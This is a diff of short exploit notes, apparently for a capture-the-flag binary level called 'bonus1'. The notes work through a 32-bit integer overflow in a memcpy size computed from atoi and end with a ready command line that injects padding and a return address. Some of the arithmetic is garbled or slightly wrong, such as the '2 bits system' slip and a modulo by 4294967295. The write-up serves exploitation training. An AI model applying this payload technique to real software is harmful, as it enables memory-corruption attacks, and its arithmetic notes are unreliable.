@@ -1,21 +1,17 @@
 
-/*************/
-/*  Strat    */
-/*************/
+overflow size_t in memcpy, possible because we are on 32 bits system
 
-Strategy 1: use memcpy with negative value
-==> FAIL, corrupt stack 
+max int on 32 bits: [2147483647 - 2147483648]
+max size_t on 32 bits: [0 - 4294967295]
 
-Strategy 2: overflow size_t in memcpy, possible because we are on 32 bits system
+=> We need a number < 10 with atoi 
 
-max int on 32 bits: 2147483647 - 2147483648 
-max size_t on 32 bits: 0 - 4294967295
+=> We can overflow the memcpy -> we are on 32 bits system  
 
-=> overflow the memcpy -> we are on 2 bits system so it's possible 
-=> max size_t / 4 = (4294967295 / 4) = 1073741823.75 => 
-=> test with (1073741822 * 4) = 4294967288
-=> 4294967295 - 4294967288 = 7 bytes we can write 7 bytes 
-=> fuzzing with differents values -> "AAAA"*14 + "BBBB"  
+-> max size_t / 4 = (4294967295 / 4) = 1073741823.75 => 
+-> (-1073741822 * 4) % 4294967295 = we can write 8 bytes
+-> (-1073741809 * 4) % 4294967295 = we can write 60 bytes
 
-./bonus1 -1073741800 `python  -c 'print "AABB"*14 + "\x82\x84\x04\x08"'`
+=> fuzzing ret addr main-> "AAAA"*14 + "BBBB"  (payload length: 60)
 
+./bonus1 -1073741809 `python  -c 'print "AABB"*14 + "\x82\x84\x04\x08"'`
